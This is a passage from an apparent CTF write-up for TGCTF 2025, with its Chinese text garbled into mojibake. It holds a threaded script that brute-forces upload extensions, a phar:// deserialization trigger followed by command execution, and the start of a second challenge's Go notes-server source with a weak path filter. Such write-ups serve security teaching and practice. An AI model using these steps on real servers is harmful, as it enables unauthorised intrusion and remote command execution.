</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">all_exts</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="k">for</span> <span class="nx">c</span> <span class="nx">in</span> <span class="nx">itertools</span><span class="o">.</span><span class="nx">product</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">,</span> <span class="nx">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">with</span> <span class="nx">ThreadPoolExecutor</span><span class="p">(</span><span class="nx">max_workers</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span> <span class="k">as</span> <span class="nx">executor</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æäº¤ä»»åŠ¡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">futures</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¼˜å…ˆæµ‹è¯•é«˜å±æ‰©å±•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">high_risk_exts</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">future</span> <span class="o">=</span> <span class="nx">executor</span><span class="o">.</span><span class="nx">submit</span><span class="p">(</span><span class="nx">test_extension</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">futures</span><span class="p">[</span><span class="nx">future</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># æäº¤å…¨é‡ç»„åˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">ext</span> <span class="nx">in</span> <span class="nx">all_exts</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">ext</span> <span class="k">not</span> <span class="nx">in</span> <span class="nx">high_risk_exts</span><span class="o">:</span>  <span class="c1"># é¿å…é‡å¤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">future</span> <span class="o">=</span> <span class="nx">executor</span><span class="o">.</span><span class="nx">submit</span><span class="p">(</span><span class="nx">test_extension</span><span class="p">,</span> <span class="nx">ext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">futures</span><span class="p">[</span><span class="nx">future</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># å®æ—¶å¤„ç†ç»“æœ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="nx">future</span> <span class="nx">in</span> <span class="nx">as_completed</span><span class="p">(</span><span class="nx">futures</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">success</span><span class="p">,</span> <span class="nx">ext</span> <span class="o">=</span> <span class="nx">future</span><span class="o">.</span><span class="nx">result</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">success</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] æœ‰æ•ˆåç¼€å‘ç°: {ext}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æš´åŠ›ç»ˆæ­¢æ‰€æœ‰çº¿ç¨‹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">for</span> <span class="nx">f</span> <span class="nx">in</span> <span class="nx">futures</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">f</span><span class="o">.</span><span class="nx">cancel</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="nx">executor</span><span class="o">.</span><span class="nx">shutdown</span><span class="p">(</span><span class="nx">wait</span><span class="o">=</span><span class="k">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">ext</span>
</span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;æµ‹è¯• {ext.ljust(8)}... å¤±è´¥&#34;</span><span class="p">,</span> <span class="nx">end</span><span class="o">=</span><span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="nx">flush</span><span class="o">=</span><span class="k">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[-] æœªæ‰¾åˆ°æœ‰æ•ˆåç¼€&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">brute_extensions</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-tgctf-write.up/image-20250417210632194.png"
	width="1582"
	height="817"
	srcset="/p/2025-tgctf-write.up/image-20250417210632194_hu_15755b8c6fcac9d8.png 480w, /p/2025-tgctf-write.up/image-20250417210632194_hu_25f1d89a2a7e43e1.png 1024w"
	loading="lazy"
	
		alt="image-20250417210632194"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹åç¼€ä¸ºatgï¼Œç„¶åä¸Šä¼ ï¼Œç„¶ågetä¼ å‚è§¦å‘phar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">filename</span><span class="o">=</span><span class="n">phar</span><span class="p">:</span><span class="o">//</span><span class="n">uploads</span><span class="o">/</span><span class="mi">3</span><span class="n">xp</span><span class="o">.</span><span class="n">atg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†postæ‰§è¡Œå‘½ä»¤å°±å¥½</p>
<img src="image-20250417214105912.png" alt="image-20250417214105912" style="zoom:50%;" />
<h3 id="è€ç™»ç‚¸é±¼æ¥äº†"><strong>è€ç™»ï¼Œç‚¸é±¼æ¥äº†ï¼Ÿ</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;io&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;log&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;path/filepath&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;text/template&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Note ä»£è¡¨ä¸€ä¸ªç¬”è®°æ–‡ä»¶çš„ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Note</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Name</span>       <span class="kt">string</span> <span class="c1">// æ–‡ä»¶å</span>
</span></span><span class="line"><span class="cl">	<span class="nx">ModTime</span>    <span class="kt">string</span> <span class="c1">// ä¿®æ”¹æ—¶é—´</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Size</span>       <span class="kt">int64</span>  <span class="c1">// æ–‡ä»¶å¤§å°</span>
</span></span><span class="line"><span class="cl">	<span class="nx">IsMarkdown</span> <span class="kt">bool</span>   <span class="c1">// æ˜¯å¦æ˜¯Markdownæ–‡ä»¶</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// PageData ç”¨äºæ¨¡æ¿æ¸²æŸ“çš„æ•°æ®ç»“æ„</span>
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">PageData</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Notes</span> <span class="p">[]</span><span class="nx">Note</span> <span class="c1">// ç¬”è®°åˆ—è¡¨</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Error</span> <span class="kt">string</span> <span class="c1">// é”™è¯¯ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// blackJack æ£€æŸ¥è·¯å¾„æ˜¯å¦åŒ…å«å±é™©å­—ç¬¦</span>
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">blackJack</span><span class="p">(</span><span class="nx">path</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="s">&#34;..&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;éæ³•è·¯å¾„&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// renderTemplate æ¸²æŸ“HTMLæ¨¡æ¿</span>
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">renderTemplate</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">tmpl</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">data</span> <span class="kd">interface</span><span class="p">{})</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nx">templates</span><span class="p">.</span><span class="nf">ExecuteTemplate</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">tmpl</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// renderError æ¸²æŸ“é”™è¯¯é¡µé¢</span>
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">message</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">code</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">w</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">templates</span><span class="p">.</span><span class="nf">ExecuteTemplate</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;error.html&#34;</span><span class="p">,</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}{</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;Code&#34;</span><span class="p">:</span>    <span class="nx">code</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;Message&#34;</span><span class="p">:</span> <span class="nx">message</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">templates</span> <span class="p">=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">Must</span><span class="p">(</span><span class="nx">template</span><span class="p">.</span><span class="nf">ParseGlob</span><span class="p">(</span><span class="s">&#34;templates/*&#34;</span><span class="p">))</span> <span class="c1">// æ¨¡æ¿å¼•æ“</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">os</span><span class="p">.</span><span class="nf">Mkdir</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span> <span class="c1">// åˆ›å»ºç¬”è®°å­˜å‚¨ç›®å½•</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// æ£€æŸ¥/flagè·¯å¾„ï¼ˆæ¼”ç¤ºç”¨ï¼Œå®é™…ä¼šè¿”å›é”™è¯¯ï¼‰</span>
</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nf">blackJack</span><span class="p">(</span><span class="s">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// ä¸»é¡µè·¯ç”±ï¼šæ˜¾ç¤ºæ‰€æœ‰ç¬”è®°</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">files</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">ReadDir</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;è¯»å–ç¬”è®°å¤±è´¥&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">notes</span> <span class="p">[]</span><span class="nx">Note</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">files</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">f</span><span class="p">.</span><span class="nf">IsDir</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="k">continue</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nx">info</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Info</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="nx">notes</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">notes</span><span class="p">,</span> <span class="nx">Note</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">Name</span><span class="p">:</span>       <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">				<span class="nx">ModTime</span><span class="p">:</span>    <span class="nx">info</span><span class="p">.</span><span class="nf">ModTime</span><span class="p">().</span><span class="nf">Format</span><span class="p">(</span><span class="s">&#34;2006-01-02 15:04&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">				<span class="nx">Size</span><span class="p">:</span>       <span class="nx">info</span><span class="p">.</span><span class="nf">Size</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">				<span class="nx">IsMarkdown</span><span class="p">:</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;.md&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">			<span class="p">})</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nf">renderTemplate</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;index.html&#34;</span><span class="p">,</span> <span class="nx">PageData</span><span class="p">{</span><span class="nx">Notes</span><span class="p">:</span> <span class="nx">notes</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// è¯»å–ç¬”è®°è·¯ç”±</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/read&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">name</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">blackJack</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">file</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span> <span class="nx">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;æ–‡ä»¶ä¸å­˜åœ¨&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusNotFound</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">defer</span> <span class="nx">file</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">io</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">io</span><span class="p">.</span><span class="nf">LimitReader</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="mi">10240</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;è¯»å–æ–‡ä»¶å¤±è´¥&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="s">&#34;.md&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Header</span><span class="p">().</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s">&#34;text/html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Fprintf</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">`%s`</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Header</span><span class="p">().</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s">&#34;text/plain&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// å†™å…¥ç¬”è®°è·¯ç”±</span>
